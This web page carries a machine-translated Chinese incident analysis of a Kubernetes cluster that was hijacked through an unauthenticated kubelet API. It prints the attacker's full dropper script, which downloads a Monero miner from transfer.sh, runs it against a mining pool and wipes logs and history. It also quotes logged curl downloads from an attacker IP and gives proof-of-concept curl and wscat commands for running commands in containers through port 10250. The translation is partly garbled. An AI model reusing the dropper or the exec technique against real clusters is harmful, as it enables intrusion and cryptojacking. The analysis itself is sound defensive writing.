<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ‘¨ğŸ¿â€ğŸ”§ ğŸ¥™ ğŸ‘¨â€â¤ï¸â€ğŸ’‹â€ğŸ‘¨ Kubernetes hackåˆ†æ-é€šè¿‡kubeletåé—¨ ğŸš‘ ğŸ ğŸ‘©ğŸ½â€ğŸš’</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="å¯¹äºKubernetesä¸€æ— æ‰€çŸ¥ï¼Œæœ€è¿‘ä¸‰å¹´äººä»¬ä¸å¾—ä¸ä½åœ¨ä¸€ä¸ªå±±æ´é‡Œã€‚ Handyå¼€å‘åŸºç¡€æ¶æ„ï¼ŒCI / CDå’Œç”Ÿäº§å‡åŸºäºKuberneteså¤šé›†ç¾¤ç”Ÿæ€ç³»ç»Ÿæ„å»ºã€‚ å¯ä»¥è¯´æˆ‘ä»¬æ˜¯Handyä¸­Kubernetesçš„ç²‰ä¸ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå½“æˆ‘ä»¬åŒäº‹çš„Kubernetesç§æœ‰é›†ç¾¤ä¸Šå‘¨æœ«é­åˆ°é»‘å®¢æ”»å‡»æ—¶ï¼Œæˆ‘ä»¬æ„Ÿåˆ°éå¸¸...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Kubernetes hackåˆ†æ-é€šè¿‡kubeletåé—¨</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/southbridge/blog/413565/"><p><img src="https://habrastorage.org/webt/jf/iu/sw/jfiuswz3kv_toqc5ghhnm8-1cgu.jpeg"></p><br><p> å¯¹äºKubernetesä¸€æ— æ‰€çŸ¥ï¼Œæœ€è¿‘ä¸‰å¹´äººä»¬ä¸å¾—ä¸ä½åœ¨ä¸€ä¸ªå±±æ´é‡Œã€‚  Handyå¼€å‘åŸºç¡€æ¶æ„ï¼ŒCI / CDå’Œç”Ÿäº§å‡åŸºäºKuberneteså¤šé›†ç¾¤ç”Ÿæ€ç³»ç»Ÿæ„å»ºã€‚ å¯ä»¥è¯´æˆ‘ä»¬æ˜¯Handyä¸­Kubernetesçš„ç²‰ä¸ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå½“æˆ‘ä»¬åŒäº‹çš„Kubernetesç§æœ‰é›†ç¾¤ä¸Šå‘¨æœ«é­åˆ°é»‘å®¢æ”»å‡»æ—¶ï¼Œæˆ‘ä»¬æ„Ÿåˆ°éå¸¸æƒŠè®¶ã€‚ </p><br><p> ä»–ä»¬æ„Ÿåˆ°æƒŠè®¶å’Œæ¬£å–œï¼Œå› ä¸ºä»–ä»¬åœ¨Kubernetesä¸­å‘ç°äº†ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„æ•…éšœã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ç ”ç©¶åŒäº‹çš„é›†ç¾¤æ˜¯å¦‚ä½•è¢«é»‘å®¢å…¥ä¾µçš„ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡åœ¨è‡ªå·±çš„é›†ç¾¤ä¸­é‡æ–°åˆ›å»ºè¿™ç§æ”»å‡»æ¥ç¡®è®¤æˆ‘ä»¬çš„å‘ç°ã€‚ è¯¥æ”»å‡»å·²åœ¨Kubernetes 1.9ä¸­è¿›è¡Œäº†æµ‹è¯•ï¼Œä½†å¯ä»¥åœ¨è¾ƒæ—§çš„ç¾¤é›†ä¸Šä½¿ç”¨ã€‚ </p><br><p>  <strong>å…è´£å£°æ˜</strong> ï¼šæœ¬æ–‡æ˜¯å…³äºæˆ‘ä»¬åŒäº‹çš„ä¸ªäººæœåŠ¡å™¨çš„ã€‚  <strong>åŸºç¡€è®¾æ–½ä¾¿æ·æŠ€æœ¯å¹¶æœªå—åˆ°æŸå®³ã€‚</strong> </p><a name="habracut"></a><br><h3 id="hak"> å“ˆå…‹ </h3><br><p> æœ‰ç¼ºé™·çš„é›†ç¾¤æ˜¯åœ¨Alpine Linuxä¹‹ä¸Šè¿è¡Œçš„å”¯ä¸€Kuberneteséƒ¨ç½²èŠ‚ç‚¹ã€‚ ç¬¬ä¸€ä¸ªé»‘å®¢æŒ‡ç¤ºå™¨æ˜¯ä¸€ä¸ªå¯ç–‘è¿›ç¨‹ï¼Œå®ƒæ˜¯dockerå®ˆæŠ¤ç¨‹åºçš„å­è¿›ç¨‹ï¼š </p><br><pre><code class="hljs powershell">/tmp/udevs <span class="hljs-literal"><span class="hljs-literal">-o</span></span> stratum+tcp://pool.zer0day.ru:<span class="hljs-number"><span class="hljs-number">8080</span></span> <span class="hljs-literal"><span class="hljs-literal">-u</span></span> NewWorld <span class="hljs-literal"><span class="hljs-literal">-p</span></span> NewWorld -<span class="hljs-literal"><span class="hljs-literal">-safe</span></span> <span class="hljs-literal"><span class="hljs-literal">-B</span></span></code> </pre> <br><p> ç«¯ç‚¹å·æ›²å°†è¿”å›ä»¥ä¸‹æ–‡æœ¬ï¼š </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">Mining</span></span> Proxy Online</code> </pre> <br><p> ä¼¼ä¹æœ‰äººæ‰¾åˆ°äº†ä¸€ç§å°†åŠ å¯†çŸ¿è½¯ä»¶æ”¾å…¥å·¥ä½œå®¹å™¨å¹¶å¯åŠ¨è¯¥è¿‡ç¨‹çš„æ–¹æ³•ã€‚ </p><br><p> åœ¨<strong>docker</strong>è¦†ç›–ç›®å½•ä¸­çš„å®¹å™¨<em>ï¼ˆ/ var / lib / docker / overlay2 / b5a8a22f1e41b3b1ce504a6c941fb2805c28a454f75e2831c3a38d4d35388bd7ï¼‰ä¸­</em>æœç´¢<strong>udevs</strong>æ–‡ä»¶æ—¶ï¼Œä¼šä¸‹è½½å¹¶ä¸‹è½½ä¸€ä¸ªåç§°ä¸º<strong>â€œ kube.lockâ€çš„dropper</strong>è„šæœ¬ã€‚ </p><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash yum install wget -y apt-get install wget -y PS2=$(ps aux | grep udevs | grep -v "grep" | wc -l) if [ $PS2 -eq 0 ]; then rm -rf /tmp/udevs* wget https://transfer.sh/JyRqn/nodepadxx --no-check-certificate -O /tmp/udevs fi if [[ $? -ne 0 &amp;&amp; $PS2 -eq 0 ]]; then curl -sk https://transfer.sh/JyRqn/nodepadxx -o /tmp/udevs fi chmod +x /tmp/udevs chmod 777 /tmp/udevs if [ $PS2 -eq 0 ]; then /tmp/udevs -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B fi if [[ $? -ne 0 &amp;&amp; $PS2 -eq 0 ]]; then echo $? wget https://transfer.sh/9uRre/glibc-2.14.tar.gz --no-check-certificate -O /tmp/glibc-2.14.tar.gz &amp;&amp; tar zxvf /tmp/glibc-2.14.tar.gz -C /tmp/ &amp;&amp; export LD_LIBRARY_PATH=/tmp/opt/glibc-2.14/lib:$LD_LIBRARY_PATH &amp;&amp; /tmp/udevs -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B &amp;&amp; echo "" &gt; /var/log/wtmp &amp;&amp; echo "" &gt; /var/log/secure &amp;&amp; history -c fi</span></span></code> </pre> <br><p> æ­¤å¤–ï¼ŒVirusTotalä¸Š<strong>/ tmp / udevsç¨‹åº</strong>çš„MD5ç­¾å<em>ï¼ˆa4404be67a41f144ea86a7838f357c26ï¼‰</em> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">è¢«å®šä¹‰</a>ä¸ºå¯èƒ½çš„Monero Minerï¼š </p><br><p><img src="https://habrastorage.org/webt/x8/jk/qp/x8jkqpi8y219s6uw0u7kmjqytka.png"></p><br><p> å› æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“ç ´è§£è€…ä»¥æŸç§æ–¹å¼å°†<strong>kube.lock</strong>è„šæœ¬æ”¾å…¥å®¹å™¨ä¸­å¹¶è¿è¡Œå®ƒã€‚ ä½†æ˜¯å¦‚ä½•ï¼Ÿ </p><br><p>  kubernetes apiæœåŠ¡å™¨çš„å…¬å…±è®¿é—®å·²æ‰“å¼€ï¼Œä½†å—åˆ°è¯ä¹¦èº«ä»½éªŒè¯çš„ä¿æŠ¤ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å‡è®¾é›†ç¾¤ä¸­å·¥ä½œçš„å›¾åƒä¹‹ä¸€åœ¨ä¾›åº”é“¾ä¸Šå—åˆ°æ”»å‡»ã€‚ ä½†æ˜¯ï¼Œåœ¨ç ”ç©¶äº†kubeletæ—¥å¿—åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä»¥ä¸‹å‡ ç‚¹ï¼š </p><br><pre> <code class="hljs pgsql">/var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400289</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">95</span></span>bd5c4a43003517c0077fbad285070fb3c5a94ff5d5c82e02c1d074635d1829 <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing /var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400974</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">916</span></span>f8bff4edb547a3e3de184968bb651717883e8b3856e76d0ebc95ecbeb3a3d <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing</code> 'ä»è¿è¡Œæ—¶ <code class="hljs pgsql">/var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400289</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">95</span></span>bd5c4a43003517c0077fbad285070fb3c5a94ff5d5c82e02c1d074635d1829 <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing /var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400974</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">916</span></span>f8bff4edb547a3e3de184968bb651717883e8b3856e76d0ebc95ecbeb3a3d <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing</code> </pre> <br><p> çœ‹èµ·æ¥é¥¼å¹²åœ¨æŸç§ç¨‹åº¦ä¸Šæ˜¯kubeletä¸­çš„<strong>exec exec</strong> ã€‚  Googleåº”è¯·æ±‚â€œèº«ä»½éªŒè¯Kubeletâ€å‘å¸ƒäº†Kubernetesæ–‡æ¡£ä¸­çš„æ–‡æœ¬ï¼š </p><br><blockquote>  <em>é»˜è®¤æƒ…å†µä¸‹ï¼Œæœªé€šè¿‡å…¶ä»–é…ç½®çš„èº«ä»½éªŒè¯æ–¹æ³•æ‹’ç»çš„å¯¹HTTPS kubeletç»ˆç»“ç‚¹çš„è¯·æ±‚å°†è¢«è§†ä¸ºåŒ¿åè¯·æ±‚ï¼Œå…¶ä½¿ç”¨<strong>ç³»ç»Ÿï¼šåŒ¿å</strong>ç”¨æˆ·åå’Œ<strong>ç³»ç»Ÿï¼šæœªè®¤è¯ç»„</strong> ã€‚</em> </blockquote><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Kubeletèº«ä»½éªŒè¯/æˆæƒ</a> </p><br><p> å¦‚æœåœ¨Kubeletä¸­æœªæŒ‡å®šä»»ä½•æ ‡å¿—ï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨æ¥å—æœªé€šè¿‡èº«ä»½éªŒè¯çš„APIè¯·æ±‚çš„æ¨¡å¼ã€‚ è¯·è®°ä½ï¼Œè¦ä½¿ä¸»èŠ‚ç‚¹-&gt;èŠ‚ç‚¹é“¾æ¥æ­£å¸¸å·¥ä½œï¼ŒKubernetes APIæœåŠ¡å™¨å¿…é¡»ä¸èŠ‚ç‚¹ä¸Šçš„kubeletäº¤æ¢ä¿¡æ¯ã€‚ </p><br><p> äº‹å®è¯æ˜ï¼Œæˆ‘ä»¬åŒäº‹çš„æœåŠ¡å™¨è¿˜å…¬å¼€æš´éœ²äº†kubeletç«¯å£ï¼ˆtcp 10250ï¼Œtcp 10255ï¼‰ã€‚ å°½ç®¡é”™è¯¯å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯æœ€å¥½æ£€æŸ¥ä¸€ä¸‹è‡ªå·±çš„Kubernetesçš„éƒ¨ç½²æ–¹å¼ã€‚ </p><br><p>  <u>å¦‚æœç”¨æˆ·æœ‰æƒè®¿é—®èŠ‚ç‚¹ï¼Œåˆ™kubelet APIæ˜¯å°šæœªé€šè¿‡APIèº«ä»½éªŒè¯çš„ç¾¤é›†çš„åŠŸèƒ½é½å…¨çš„åé—¨ã€‚</u> </p><br><p> å› æ­¤ï¼Œå¦‚æœæ‚¨åœ¨æ¿€æ´»èº«ä»½éªŒè¯å’Œæˆæƒï¼ˆwebhookï¼ŒRBACç­‰ï¼‰æ—¶é‡åˆ°é—®é¢˜ï¼Œè¯·ç¡®ä¿ä¿æŠ¤kubeletã€‚ </p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å…³äº</a> Kubeleté€šä¿¡<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">çš„</a>å®‰å…¨æ€§å­˜åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä¸¥é‡çš„é—®é¢˜</a> ï¼Œè¿™ä¸ªé—®é¢˜å€¼å¾—æ›´å¤šå…³æ³¨ã€‚ </p><br><h3 id="dokazatelstvo-koncepcii"> æ¦‚å¿µè¯æ˜ </h3><br><p> è¦å°†å‘½ä»¤ç›´æ¥å‘é€åˆ°kubeletï¼Œå¿…é¡»ä½¿ç”¨å¦‚ä¸‹æ‰€è¿°çš„APIï¼š </p><br><p><img src="https://habrastorage.org/webt/zl/5n/h2/zl5nh2hoybnvdyiacczyfsy2yv4.png"></p><br><p>  Kubeletä¾¦å¬ä¸¤ä¸ªç«¯å£ï¼š10255å’Œ10250ã€‚ç¬¬ä¸€ä¸ªæ˜¯åªè¯»HTTPç«¯å£ï¼Œç¬¬äºŒä¸ªæ˜¯å¯ä»¥æ‰§è¡Œä»»ä½•æ“ä½œçš„HTTPSç«¯å£ã€‚ </p><br><p>  <strong>é€‰æ‹©é›†ç¾¤ä¸­çš„ä»»ä½•èŠ‚ç‚¹ï¼Œç„¶åå°è¯•åˆ—å‡ºPodï¼š</strong> </p><br><pre> <code class="hljs powershell">curl -<span class="hljs-literal"><span class="hljs-literal">-insecure</span></span> https://kube<span class="hljs-literal"><span class="hljs-literal">-node</span></span><span class="hljs-literal"><span class="hljs-literal">-here</span></span>:<span class="hljs-number"><span class="hljs-number">10250</span></span>/pods | jq</code> </pre> <br><p>  <strong>exec</strong>çš„è·¯ç”±ï¼ˆæœªåœ¨kubeleté¡µé¢ä¸Šè®°å½•ï¼‰ä¸APIæœåŠ¡å™¨è·¯ç”±ç±»ä¼¼ï¼Œä½†éœ€è¦ä¸¤ä¸ªè¯·æ±‚ï¼šåˆå§‹POSTå’Œéšåçš„GETï¼Œè¯¥GETä½¿ç”¨æ”¯æŒSPDYçš„å®¢æˆ·ç«¯ï¼ˆæˆ–ä¹Ÿæ”¯æŒçš„Websocketå®¢æˆ·ç«¯ï¼‰ã€‚ </p><br><p>  <strong>é€šè¿‡kubeletåœ¨æ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ã€‚</strong> </p><br><p> æ‰¾åˆ°è¦åœ¨ä¸Šä¸€ä¸ªè¯·æ±‚ä¸­ä½œä¸ºç›®æ ‡çš„èŠ‚ç‚¹ä¸Šè¿è¡Œçš„é‚£ä¸ªã€‚ ä½¿ç”¨curlè¿è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼š </p><br><pre> <code class="hljs powershell">curl -<span class="hljs-literal"><span class="hljs-literal">-insecure</span></span> <span class="hljs-literal"><span class="hljs-literal">-v</span></span> <span class="hljs-literal"><span class="hljs-literal">-H</span></span> <span class="hljs-string"><span class="hljs-string">"X-Stream-Protocol-Version: v2.channel.k8s.io"</span></span> <span class="hljs-literal"><span class="hljs-literal">-H</span></span> <span class="hljs-string"><span class="hljs-string">"X-Stream-Protocol-Version: channel.k8s.io"</span></span> <span class="hljs-literal"><span class="hljs-literal">-X</span></span> POST <span class="hljs-string"><span class="hljs-string">"https://kube-node-here:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=touch&amp;command=hello_world&amp;input=1&amp;output=1&amp;tty=1"</span></span></code> </pre> <br><p> è¿™åº”è¯¥è¿”å›å¸¦æœ‰ä»£ç 302çš„å“åº”ï¼Œè¯¥å“åº”å°†é‡å®šå‘åˆ°æµï¼š </p><br><pre> <code class="hljs pgsql">&lt; HTTP/<span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">302</span></span> &lt; <span class="hljs-keyword"><span class="hljs-keyword">location</span></span>: /cri/exec/PfWkLulG &lt; content-<span class="hljs-keyword"><span class="hljs-keyword">type</span></span>: <span class="hljs-type"><span class="hljs-type">text</span></span>/plain; charset=utf<span class="hljs-number"><span class="hljs-number">-8</span></span> &lt; content-length: <span class="hljs-number"><span class="hljs-number">0</span></span> &lt; <span class="hljs-type"><span class="hljs-type">date</span></span>: Tue, <span class="hljs-number"><span class="hljs-number">13</span></span> Mar <span class="hljs-number"><span class="hljs-number">2018</span></span> <span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span> GMT</code> </pre> <br><p> ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">wscat</a>å¯åŠ¨æµï¼š </p><br><pre> <code class="hljs powershell">wscat <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-string"><span class="hljs-string">"https://kube-node-here:10250/cri/exec/PfWkLulG"</span></span> -<span class="hljs-literal"><span class="hljs-literal">-no</span></span><span class="hljs-literal"><span class="hljs-literal">-check</span></span> connected (press CTRL+C to quit) &lt; &lt; disconnected</code> </pre> <br><p> ç”±äºæˆ‘ä»¬åªæ˜¯<code>touch hello_world</code> ï¼Œå› æ­¤å®ƒå°†åˆ›å»ºæ–‡ä»¶å¹¶æ–­å¼€è¿æ¥ã€‚ å¦‚æœè¦æ‰§è¡Œå¸¦è¾“å‡ºçš„å‘½ä»¤ï¼Œåˆ™åœ¨æ‰§è¡Œä¸Šè¿°å‘½ä»¤åå°†çœ‹åˆ°ç»“æœã€‚ </p><br><h3 id="zaklyuchenie"> ç»“è®º </h3><br><p> å°½ç®¡æ­¤è¡Œä¸ºä¸æ–‡æ¡£ä¸€è‡´ï¼Œä½†è®¸å¤šäººä¸çŸ¥é“å¦‚æœæ²¡æœ‰é€‚å½“çš„é…ç½®ï¼Œä»–ä»¬ä¼šåœ¨Kuberneteså¤šç”¨æˆ·ç¯å¢ƒä¸­é‡åˆ°å®‰å…¨æ¼æ´ã€‚ </p><br><p> æˆ‘ä»¬å·²ç»è®¨è®ºäº†Kubernetesçš„å®‰å…¨é—®é¢˜ä¹‹ä¸€ã€‚ è¯„è®ºï¼ </p><br><h3 id="obnovlenie-14-marta-2018">  2018å¹´3æœˆ14æ—¥è¡¥ä¸ </h3><br><p> ç»è¿‡æ·±å…¥ç ”ç©¶ï¼Œä¼¼ä¹å³ä½¿å¯ç”¨äº†Kubeletèº«ä»½éªŒè¯ï¼Œå®ƒä¹Ÿä»…é€‚ç”¨äºHTTPSç«¯å£ï¼ˆ10250ï¼‰ã€‚ è¿™æ„å‘³ç€åªè¯»çš„HTTPç«¯å£ï¼ˆ10255ï¼‰ä»ç„¶ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œæ²¡æœ‰ç½‘ç»œACLä»¥å¤–çš„ä»»ä½•å®‰å…¨åŠŸèƒ½ã€‚ </p><br><p> è¯»å–ç«¯å£å¯ä»¥åˆ—å‡º<code>/pods</code>è·¯ç”±ä¸Šçš„ç‚‰åºŠè§„æ ¼ï¼Œè¿™æ„å‘³ç€å¯ä»¥è®¿é—®æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚ç¯å¢ƒå˜é‡ã€‚ </p><br><p> å°±åœ¨28å¤©å‰ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ›´æ”¹</a>äº†<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä»£ç ï¼Œä»¥ä¾¿</a>é»˜è®¤æƒ…å†µä¸‹ç¦ç”¨ä¸å®‰å…¨çš„ç«¯å£ã€‚ </p><br><p> åŸæ–‡ï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åˆ†æKubernetesé»‘å®¢-é€šè¿‡kubeletè¿›è¡Œåé—¨</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN413565/">https://habr.com/ru/post/zh-CN413565/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN413555/index.html">åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å®‰å…¨äº’æ“ä½œæ€§</a></li>
<li><a href="../zh-CN413557/index.html">NewSQLï¼šSQLåˆ°å¤„éƒ½è¡Œä¸é€š</a></li>
<li><a href="../zh-CN413559/index.html">Webé™çº§æˆ–å¦‚ä½•ä½¿Webå¯è¯»</a></li>
<li><a href="../zh-CN413561/index.html">ç¼–è¯‘çš„Linqè¡¨è¾¾å¼æ ‘é€Ÿåº¦</a></li>
<li><a href="../zh-CN413563/index.html">å°†åŒ…å¯¼å…¥Goçš„4ç§æ–¹æ³•</a></li>
<li><a href="../zh-CN413567/index.html">Spring Bootä¸­çš„å¾®æœåŠ¡å…¥é—¨</a></li>
<li><a href="../zh-CN413569/index.html">æ‹†å¸å·¥å‚18650é”‚ç¦»å­ç”µæ± </a></li>
<li><a href="../zh-CN413571/index.html">ç¬¬25æœŸï¼šITåŸ¹è®­-å½“å‰é—®é¢˜å’Œé¢†å…ˆå…¬å¸çš„æŒ‘æˆ˜</a></li>
<li><a href="../zh-CN413575/index.html">BricsCAD Shape-Bricsysæä¾›çš„å…è´¹3D CAD</a></li>
<li><a href="../zh-CN413577/index.html">[å…¬å‘Š]åœ¨ä¿„ç½—æ–¯ä¸ƒä¸ªåŸå¸‚çš„CodinGame.comä¸Šè¿›è¡Œæ¯”èµ›çš„æ¢çº½</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>